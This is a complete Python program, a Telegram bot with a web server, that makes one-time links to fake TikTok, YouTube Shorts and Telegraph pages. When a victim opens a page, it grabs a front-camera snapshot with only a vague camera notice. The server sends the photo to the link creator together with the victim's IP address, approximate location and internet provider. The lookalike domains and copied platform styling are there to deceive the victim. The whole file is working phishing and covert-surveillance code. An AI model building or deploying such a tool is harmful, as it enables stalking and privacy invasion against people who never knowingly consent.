import asyncio
import json
import os
import secrets
import sqlite3
from contextlib import closing
from pathlib import Path

import httpx
import uvicorn
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.types import BufferedInputFile, KeyboardButton, Message, ReplyKeyboardMarkup
from fastapi import FastAPI, File, HTTPException, Request, UploadFile
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

BOT_TOKEN = os.environ["BOT_TOKEN"]
PUBLIC_BASE_URL = os.environ["PUBLIC_BASE_URL"].rstrip("/")
PORT = int(os.getenv("PORT", "8000"))
DB_PATH = Path(os.getenv("DB_PATH", "links.sqlite3"))
MAX_PHOTO_BYTES = 10 * 1024 * 1024

# Определяем текущий сервис по домену
SERVICE_TYPE = "tiktok"  # по умолчанию
if "telegra-ph" in PUBLIC_BASE_URL or "telegraph" in PUBLIC_BASE_URL:
    SERVICE_TYPE = "telegraph"
elif "youtube" in PUBLIC_BASE_URL or "shorts" in PUBLIC_BASE_URL:
    SERVICE_TYPE = "youtube"
elif "tiktok" in PUBLIC_BASE_URL or "vt-tiktok" in PUBLIC_BASE_URL:
    SERVICE_TYPE = "tiktok"

# Инициализация бота
bot = Bot(BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)
app = FastAPI(docs_url=None, redoc_url=None)

# Монтируем статические файлы
app.mount("/static", StaticFiles(directory="."), name="static")

SERVICES = {
    "tiktok": {"name": "TikTok", "emoji": "🎵", "route": "tiktok"},
    "youtube": {"name": "YouTube", "emoji": "📺", "route": "youtube"},
    "telegraph": {"name": "Telegraph", "emoji": "📝", "route": "telegraph"},
}


def db_init() -> None:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute(
            """
            CREATE TABLE IF NOT EXISTS links (
                token TEXT PRIMARY KEY,
                owner_chat_id INTEGER NOT NULL,
                used INTEGER NOT NULL DEFAULT 0,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
                service TEXT NOT NULL DEFAULT 'tiktok',
                title TEXT DEFAULT '',
                content TEXT DEFAULT ''
            )
            """
        )
        columns = {row[1] for row in con.execute("PRAGMA table_info(links)").fetchall()}
        if "service" not in columns:
            con.execute("ALTER TABLE links ADD COLUMN service TEXT NOT NULL DEFAULT 'tiktok'")
        if "title" not in columns:
            con.execute("ALTER TABLE links ADD COLUMN title TEXT DEFAULT ''")
        if "content" not in columns:
            con.execute("ALTER TABLE links ADD COLUMN content TEXT DEFAULT ''")
        con.commit()


def create_link(owner_chat_id: int, service: str, title: str = "", content: str = "") -> str:
    if service not in SERVICES:
        service = "tiktok"
    while True:
        token = secrets.token_urlsafe(18)
        try:
            with closing(sqlite3.connect(DB_PATH)) as con:
                con.execute(
                    "INSERT INTO links(token, owner_chat_id, used, service, title, content) VALUES (?, ?, 0, ?, ?, ?)",
                    (token, owner_chat_id, service, title, content),
                )
                con.commit()
            return token
        except sqlite3.IntegrityError:
            continue


def get_link(token: str):
    with closing(sqlite3.connect(DB_PATH)) as con:
        return con.execute(
            "SELECT owner_chat_id, used, service, title, content FROM links WHERE token = ?", (token,)
        ).fetchone()


def get_link_by_short_id(short_id: str, service: str = None):
    """Поиск ссылки по короткому ID и сервису"""
    with closing(sqlite3.connect(DB_PATH)) as con:
        if service:
            query = "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ? AND service = ?"
            return con.execute(query, (f"{short_id}%", service)).fetchone()
        else:
            query = "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ?"
            return con.execute(query, (f"{short_id}%",)).fetchone()


def claim_link(token: str) -> bool:
    """Temporarily claims an unused link so two uploads cannot race each other."""
    with closing(sqlite3.connect(DB_PATH)) as con:
        cur = con.execute(
            "UPDATE links SET used = 2 WHERE token = ? AND used = 0", (token,)
        )
        con.commit()
        return cur.rowcount == 1


def finish_link(token: str) -> None:
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute("UPDATE links SET used = 1 WHERE token = ?", (token,))
        con.commit()


def release_link(token: str) -> None:
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute("UPDATE links SET used = 0 WHERE token = ? AND used = 2", (token,))
        con.commit()


def client_ip(request: Request) -> str:
    cf = request.headers.get("cf-connecting-ip")
    if cf:
        return cf.strip()
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


async def lookup_ip(ip: str) -> dict:
    if ip in {"unknown", "127.0.0.1", "::1"}:
        return {}
    try:
        async with httpx.AsyncClient(timeout=6.0) as client:
            r = await client.get(f"https://ipwho.is/{ip}")
            r.raise_for_status()
            data = r.json()
            if not data.get("success", True):
                return {}
            return data
    except Exception:
        return {}


def public_link(service: str, token: str) -> str:
    """Генерирует ссылку в зависимости от сервиса"""
    short_id = token[:8]
    base = PUBLIC_BASE_URL.replace('https://', '').split('/')[0]
    
    # Для каждого сервиса свой формат ссылки
    if service == "tiktok":
        return f"https://{base}/@{short_id}"
    elif service == "youtube":
        return f"https://{base}/shorts/{short_id}"
    elif service == "telegraph":
        return f"https://{base}/{short_id}"
    else:
        return f"{PUBLIC_BASE_URL}/{service}/{token}"


def service_keyboard() -> ReplyKeyboardMarkup:
    """Клавиатура с тремя кнопками для всех сервисов"""
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎵 TikTok")],
            [KeyboardButton(text="📺 YouTube")],
            [KeyboardButton(text="📝 Telegraph")],
        ],
        resize_keyboard=True,
    )


@router.message(CommandStart())
async def start(message: Message):
    await message.answer(
        "👋 Выберите оформление страницы:\n\n"
        "🎵 TikTok — стиль видео\n"
        "📺 YouTube — стиль Shorts\n"
        "📝 Telegraph — стиль статьи",
        reply_markup=service_keyboard(),
    )


@router.message(Command("new"))
async def new_link_command(message: Message):
    await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())


@router.message(F.text.in_({"🎵 TikTok", "📺 YouTube", "📝 Telegraph"}))
async def create_service_link(message: Message):
    service_map = {
        "🎵 TikTok": "tiktok",
        "📺 YouTube": "youtube",
        "📝 Telegraph": "telegraph",
    }
    service = service_map.get(message.text)
    if not service:
        return

    if service == "telegraph":
        await message.answer(
            "📝 Введите заголовок статьи (или отправьте '-' для пропуска):"
        )
        user_data[message.chat.id] = {"service": service, "step": "title"}
        return

    token = create_link(message.chat.id, service)
    url = public_link(service, token)
    info = SERVICES[service]

    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
        resize_keyboard=True,
    )
    
    await message.answer(
        f"{info['emoji']} Одноразовая ссылка создана:\n"
        f"<a href='{url}'>{url}</a>\n\n"
        f"Оформление страницы: {info['name']}.\n"
        "После успешной отправки фото ссылка перестанет работать.",
        parse_mode="HTML",
        reply_markup=kb,
        disable_web_page_preview=False,
    )


# Хранилище состояний пользователей
user_data = {}


@router.message(F.text)
async def handle_telegraph_input(message: Message):
    chat_id = message.chat.id
    if chat_id not in user_data:
        return
    
    state = user_data[chat_id]
    service = state.get("service")
    step = state.get("step")
    
    if service == "telegraph" and step == "title":
        title = message.text.strip()
        if title == "-":
            title = "📝 Статья Telegraph"
        state["title"] = title
        state["step"] = "content"
        await message.answer(
            "✍️ Введите текст статьи (или отправьте '-' для стандартного текста):"
        )
        return
    
    elif service == "telegraph" and step == "content":
        content = message.text.strip()
        if content == "-":
            content = "Это пример статьи, созданной через бота. Вы можете добавить свой текст."
        
        token = create_link(chat_id, service, state.get("title", "📝 Статья Telegraph"), content)
        url = public_link("telegraph", token)
        info = SERVICES[service]
        
        del user_data[chat_id]
        
        kb = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
            resize_keyboard=True,
        )
        
        await message.answer(
            f"{info['emoji']} Одноразовая ссылка создана:\n"
            f"<a href='{url}'>{url}</a>\n\n"
            f"Оформление страницы: {info['name']}.\n"
            "После успешной отправки фото ссылка перестанет работать.",
            parse_mode="HTML",
            reply_markup=kb,
            disable_web_page_preview=False,
        )
        return


@router.message(F.text == "🔗 Создать новую ссылку")
async def new_link(message: Message):
    await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())


def generate_tiktok_page(token: str) -> str:
    short_id = token[:8]
    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
    
    return f'''<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>TikTok — @{short_id}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
:root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
body {{ background:#000; min-height:100vh; display:flex; justify-content:center; align-items:center; }}
.video-container {{ position:relative; width:100%; max-width:400px; aspect-ratio:9/16; background:#0a0a0a; border-radius:20px; overflow:hidden; box-shadow:0 0 60px rgba(0,242,234,0.15); }}
.video-container .preview {{ width:100%; height:100%; object-fit:cover; display:block; }}
.video-container video {{ width:100%; height:100%; object-fit:cover; display:none; }}
.overlay {{ position:absolute; inset:0; display:flex; flex-direction:column; justify-content:space-between; padding:20px; background:linear-gradient(180deg,rgba(0,0,0,0.6) 0%,transparent 40%,transparent 60%,rgba(0,0,0,0.8) 100%); }}
.user-info {{ display:flex; align-items:center; gap:12px; }}
.user-info .avatar {{ width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg,#00f2ea,#ff0050); display:flex; align-items:center; justify-content:center; font-size:20px; }}
.user-info .username {{ color:#fff; font-weight:700; font-size:17px; }}
.user-info .username span {{ color:#888; font-weight:400; font-size:14px; }}
.video-title {{ color:#fff; font-size:18px; font-weight:600; margin:8px 0 4px; text-shadow:0 2px 8px rgba(0,0,0,0.8); }}
.video-desc {{ color:rgba(255,255,255,0.8); font-size:14px; text-shadow:0 2px 4px rgba(0,0,0,0.8); }}
.bottom {{ display:flex; flex-direction:column; gap:12px; }}
.status {{ color:#fff; font-size:15px; text-align:center; min-height:24px; background:rgba(0,0,0,0.5); border-radius:12px; padding:10px; backdrop-filter:blur(8px); }}
.notice {{ color:rgba(255,255,255,0.7); font-size:12px; text-align:center; padding:8px; background:rgba(255,255,255,0.05); border-radius:10px; }}
.loading {{ display:flex; justify-content:center; align-items:center; gap:8px; padding:20px; }}
.spinner {{ width:32px; height:32px; border:3px solid rgba(255,255,255,0.1); border-top-color:#00f2ea; border-radius:50%; animation:spin 0.8s linear infinite; }}
@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
</style>
</head>
<body>
<div class="video-container">
  <img class="preview" id="preview" src="{photo_url}" alt="Preview">
  <video id="video" playsinline autoplay muted></video>
  <div class="overlay">
    <div class="user-info">
      <div class="avatar">🎵</div>
      <div class="username">Verhcau <span>• TikTok</span></div>
    </div>
    <div>
      <div class="video-title">Новый ролик от Verhcau</div>
      <div class="video-desc">🔥 Смотрите до конца!</div>
    </div>
    <div class="bottom">
      <div id="status" class="status"><div class="loading"><div class="spinner"></div></div></div>
      <div class="notice">⚠️ Для отправки фото нужен доступ к камере</div>
    </div>
  </div>
</div>
<script>
const token = "{token}";
const video = document.getElementById('video');
const preview = document.getElementById('preview');
const status = document.getElementById('status');
let photoSent = false;

async function requestCamera() {{
    try {{
        if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
        video.srcObject = stream;
        video.style.display = 'block';
        preview.style.display = 'none';
        await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 720;
        canvas.height = video.videoHeight || 1280;
        canvas.getContext('2d').drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
        if (!blob) throw new Error('Ошибка создания снимка');
        await sendPhoto(blob);
    }} catch (e) {{
        status.innerHTML = '❌ ' + e.message;
        status.className = 'status error';
    }}
}}

async function sendPhoto(blob) {{
    if (photoSent) return;
    photoSent = true;
    const fd = new FormData();
    fd.append('photo', blob, 'photo.jpg');
    try {{
        const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
        const data = await r.json().catch(() => ({{}}));
        if (!r.ok) throw new Error(data.detail || 'Ошибка');
        status.innerHTML = '✅';
        status.className = 'status success';
        video.style.display = 'none';
        preview.style.display = 'block';
    }} catch (e) {{
        status.innerHTML = '❌ ' + e.message;
        status.className = 'status error';
        photoSent = false;
    }}
}}

document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
</script>
</body>
</html>'''


def generate_youtube_page(token: str) -> str:
    short_id = token[:8]
    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
    
    return f'''<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>YouTube Shorts — {short_id}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
:root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:center; align-items:center; }}
.container {{ width:100%; max-width:500px; background:#1a1a1a; border-radius:20px; overflow:hidden; box-shadow:0 0 50px rgba(255,0,0,0.1); }}
.video-wrapper {{ position:relative; background:#000; aspect-ratio:9/16; overflow:hidden; }}
.video-wrapper .preview {{ width:100%; height:100%; object-fit:cover; display:block; }}
.video-wrapper video {{ width:100%; height:100%; object-fit:cover; display:none; position:absolute; top:0; left:0; }}
.video-wrapper .shorts-label {{ position:absolute; top:12px; right:12px; background:rgba(255,0,0,0.9); color:#fff; padding:4px 12px; border-radius:12px; font-size:12px; font-weight:700; letter-spacing:0.5px; z-index:2; }}
.video-wrapper .video-title {{ position:absolute; bottom:12px; left:12px; right:12px; color:#fff; font-size:16px; font-weight:600; text-shadow:0 2px 8px rgba(0,0,0,0.9); z-index:2; }}
.video-wrapper .video-desc {{ position:absolute; bottom:44px; left:12px; right:12px; color:rgba(255,255,255,0.7); font-size:13px; text-shadow:0 2px 4px rgba(0,0,0,0.8); z-index:2; }}
.content {{ padding:16px 20px 20px; }}
.title {{ color:#fff; font-size:18px; font-weight:600; margin-bottom:8px; }}
.channel {{ color:#aaa; font-size:14px; display:flex; align-items:center; gap:8px; }}
.channel .sub {{ background:#ff0000; color:#fff; padding:2px 10px; border-radius:12px; font-size:11px; font-weight:700; }}
.status {{ margin-top:12px; padding:10px 14px; background:#222; border-radius:12px; color:#fff; font-size:14px; min-height:44px; display:flex; align-items:center; gap:8px; }}
.spinner {{ width:20px; height:20px; border:2px solid rgba(255,255,255,0.1); border-top-color:#ff0000; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
.notice {{ color:#888; font-size:12px; margin-top:10px; text-align:center; padding:8px; background:#111; border-radius:8px; }}
</style>
</head>
<body>
<div class="container">
  <div class="video-wrapper">
    <img class="preview" id="preview" src="{photo_url}" alt="Preview">
    <video id="video" playsinline autoplay muted></video>
    <div class="shorts-label">#Shorts</div>
    <div class="video-desc">🔥 Смотрите до конца!</div>
    <div class="video-title">Новое видео от Verhcau</div>
  </div>
  <div class="content">
    <div class="title">YouTube Shorts</div>
    <div class="channel">🔴 Verhcau <span class="sub">Подписаться</span></div>
    <div id="status" class="status"><div class="spinner"></div></div>
    <div class="notice">⚠️ Для отправки фото нужен доступ к камере</div>
  </div>
</div>
<script>
const token = "{token}";
const video = document.getElementById('video');
const preview = document.getElementById('preview');
const status = document.getElementById('status');
let photoSent = false;

async function requestCamera() {{
    try {{
        if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
        video.srcObject = stream;
        video.style.display = 'block';
        preview.style.display = 'none';
        await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 720;
        canvas.height = video.videoHeight || 1280;
        canvas.getContext('2d').drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
        if (!blob) throw new Error('Ошибка создания снимка');
        await sendPhoto(blob);
    }} catch (e) {{
        status.innerHTML = '❌ ' + e.message;
        status.className = 'status error';
    }}
}}

async function sendPhoto(blob) {{
    if (photoSent) return;
    photoSent = true;
    const fd = new FormData();
    fd.append('photo', blob, 'photo.jpg');
    try {{
        const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
        const data = await r.json().catch(() => ({{}}));
        if (!r.ok) throw new Error(data.detail || 'Ошибка');
        status.innerHTML = '✅';
        status.className = 'status success';
        video.style.display = 'none';
        preview.style.display = 'block';
    }} catch (e) {{
        status.innerHTML = '❌ ' + e.message;
        status.className = 'status error';
        photoSent = false;
    }}
}}

document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
</script>
</body>
</html>'''


def generate_telegraph_page(token: str, title: str, content: str) -> str:
    short_id = token[:8]
    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
    
    return f'''<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Telegraph — {title}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
:root {{ color-scheme:light; font-family:Georgia,serif; }}
body {{ background:#f5f5f5; min-height:100vh; display:flex; justify-content:center; padding:20px; }}
.article {{ max-width:680px; width:100%; background:#fff; border-radius:20px; box-shadow:0 4px 24px rgba(0,0,0,0.06); overflow:hidden; }}
.article-header {{ padding:30px 32px 20px; border-bottom:1px solid #e8e8e8; }}
.article-header .badge {{ display:inline-block; background:#2c3e50; color:#fff; padding:2px 12px; border-radius:12px; font-size:11px; font-family:-apple-system,sans-serif; letter-spacing:0.5px; margin-bottom:12px; }}
.article-header h1 {{ font-size:28px; font-weight:700; color:#1a1a1a; line-height:1.3; }}
.article-header .meta {{ color:#888; font-size:14px; margin-top:8px; font-family:-apple-system,sans-serif; }}
.article-header .meta .id {{ color:#666; background:#f0f0f0; padding:2px 8px; border-radius:4px; font-size:12px; }}
.article-body {{ padding:32px; }}
.article-body .content {{ font-size:17px; line-height:1.8; color:#222; }}
.article-body .content p {{ margin-bottom:16px; }}
.article-body .content img {{ max-width:100%; border-radius:12px; margin:16px 0; }}
.camera-section {{ margin-top:24px; padding:24px; background:#f8f9fa; border-radius:16px; border:1px solid #e8e8e8; }}
.camera-section .camera-status {{ display:flex; align-items:center; gap:12px; min-height:48px; font-size:15px; color:#333; }}
.camera-section .camera-status .spinner {{ width:24px; height:24px; border:2px solid #e8e8e8; border-top-color:#2c3e50; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
.camera-section .notice {{ color:#888; font-size:13px; margin-top:12px; font-family:-apple-system,sans-serif; }}
video {{ display:none; }}
</style>
</head>
<body>
<div class="article">
  <div class="article-header">
    <div class="badge">📝 Telegraph</div>
    <h1>{title}</h1>
    <div class="meta">Опубликовано Verhcau • <span class="id">#{short_id}</span></div>
  </div>
  <div class="article-body">
    <div class="content">
      <img src="{photo_url}" alt="Preview" style="max-width:100%;border-radius:12px;margin:0 0 16px 0;">
      {content.replace(chr(10), '<br>')}
    </div>
    <div class="camera-section">
      <div id="status" class="camera-status"><div class="spinner"></div></div>
      <div class="notice">⚠️ Для отправки фото нужен доступ к камере</div>
    </div>
    <video id="video" playsinline autoplay muted></video>
  </div>
</div>
<script>
const token = "{token}";
const video = document.getElementById('video');
const status = document.getElementById('status');
let photoSent = false;

async function requestCamera() {{
    try {{
        if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
        video.srcObject = stream;
        video.style.display = 'block';
        await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
        if (!blob) throw new Error('Ошибка создания снимка');
        await sendPhoto(blob);
    }} catch (e) {{
        status.innerHTML = '❌ ' + e.message;
        status.className = 'camera-status error';
    }}
}}

async function sendPhoto(blob) {{
    if (photoSent) return;
    photoSent = true;
    const fd = new FormData();
    fd.append('photo', blob, 'photo.jpg');
    try {{
        const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
        const data = await r.json().catch(() => ({{}}));
        if (!r.ok) throw new Error(data.detail || 'Ошибка');
        status.innerHTML = '✅';
        status.className = 'camera-status success';
        video.style.display = 'none';
    }} catch (e) {{
        status.innerHTML = '❌ ' + e.message;
        status.className = 'camera-status error';
        photoSent = false;
    }}
}}

document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
</script>
</body>
</html>'''


@app.get("/", response_class=HTMLResponse)
async def root():
    return "<h3>Camera Link Bot is running. Choose service in Telegram.</h3>"


@app.get("/@{short_id}")
async def tiktok_link(short_id: str):
    """Обработчик ссылок в стиле TikTok - /@abc123def"""
    row = get_link_by_short_id(short_id, "tiktok")
    
    if not row:
        raise HTTPException(404, "Ссылка не найдена")
    
    token, owner_chat_id, used, service, title, content = row
    if used == 1:
        return HTMLResponse("<h3>Эта ссылка уже использована.</h3>", status_code=410)
    if used == 2:
        return HTMLResponse("<h3>Фото сейчас отправляется.</h3>", status_code=409)
    
    return HTMLResponse(generate_tiktok_page(token))


@app.get("/shorts/{short_id}")
async def youtube_link(short_id: str):
    """Обработчик ссылок в стиле YouTube Shorts - /shorts/abc123def"""
    row = get_link_by_short_id(short_id, "youtube")
    
    if not row:
        raise HTTPException(404, "Ссылка не найдена")
    
    token, owner_chat_id, used, service, title, content = row
    if used == 1:
        return HTMLResponse("<h3>Эта ссылка уже использована.</h3>", status_code=410)
    if used == 2:
        return HTMLResponse("<h3>Фото сейчас отправляется.</h3>", status_code=409)
    
    return HTMLResponse(generate_youtube_page(token))


@app.get("/{short_id}")
async def telegraph_link(short_id: str):
    """Обработчик ссылок в стиле Telegraph - /abc123def"""
    row = get_link_by_short_id(short_id, "telegraph")
    
    if not row:
        row = get_link_by_short_id(short_id)
        if not row:
            raise HTTPException(404, "Ссылка не найдена")
    
    token, owner_chat_id, used, service, title, content = row
    if used == 1:
        return HTMLResponse("<h3>Эта ссылка уже использована.</h3>", status_code=410)
    if used == 2:
        return HTMLResponse("<h3>Фото сейчас отправляется.</h3>", status_code=409)
    
    if service == "tiktok":
        return HTMLResponse(generate_tiktok_page(token))
    elif service == "youtube":
        return HTMLResponse(generate_youtube_page(token))
    elif service == "telegraph":
        return HTMLResponse(generate_telegraph_page(token, title or "📝 Статья Telegraph", content or "Это пример статьи, созданной через бота."))
    else:
        return HTMLResponse(generate_tiktok_page(token))


@app.post("/api/send/{token}")
async def send_photo(token: str, request: Request, photo: UploadFile = File(...)):
    row = get_link(token)
    if not row:
        raise HTTPException(404, "Ссылка не найдена")
    owner_chat_id, used, service, title, content = row
    if used != 0:
        raise HTTPException(410, "Ссылка уже использована или обрабатывается")

    content_type = (photo.content_type or "").lower()
    if content_type not in {"image/jpeg", "image/png", "image/webp"}:
        raise HTTPException(415, "Разрешены только изображения")

    data = await photo.read(MAX_PHOTO_BYTES + 1)
    if not data or len(data) > MAX_PHOTO_BYTES:
        raise HTTPException(413, "Фото слишком большое")

    if not claim_link(token):
        raise HTTPException(410, "Ссылка уже использована или обрабатывается")

    ip = client_ip(request)
    geo = await lookup_ip(ip)
    city = geo.get("city") or "не определён"
    region = geo.get("region") or "не определён"
    country = geo.get("country") or "не определена"
    isp = (geo.get("connection") or {}).get("isp") or "не определён"
    service_emoji = SERVICES.get(service, {}).get("emoji", "📸")

    caption = (
        f"{service_emoji} Получено фото по вашей ссылке\n\n"
        f"🌐 IP: {ip}\n"
        f"🏙 Город: {city}\n"
        f"🗺 Регион: {region}\n"
        f"🌍 Страна: {country}\n"
        f"📡 Провайдер: {isp}\n\n"
        "ℹ️ Местоположение определено приблизительно по IP и может отличаться от фактического."
    )

    try:
        await bot.send_photo(
            chat_id=owner_chat_id,
            photo=BufferedInputFile(data, filename="photo.jpg"),
            caption=caption,
        )
    except Exception as exc:
        release_link(token)
        raise HTTPException(502, "Не удалось доставить фото в Telegram") from exc

    finish_link(token)
    return JSONResponse({"ok": True})


async def main():
    db_init()
    
    config = uvicorn.Config(app, host="0.0.0.0", port=PORT, log_level="info")
    server = uvicorn.Server(config)
    
    await asyncio.gather(
        server.serve(),
        dp.start_polling(bot)
    )


if __name__ == "__main__":
    asyncio.run(main())
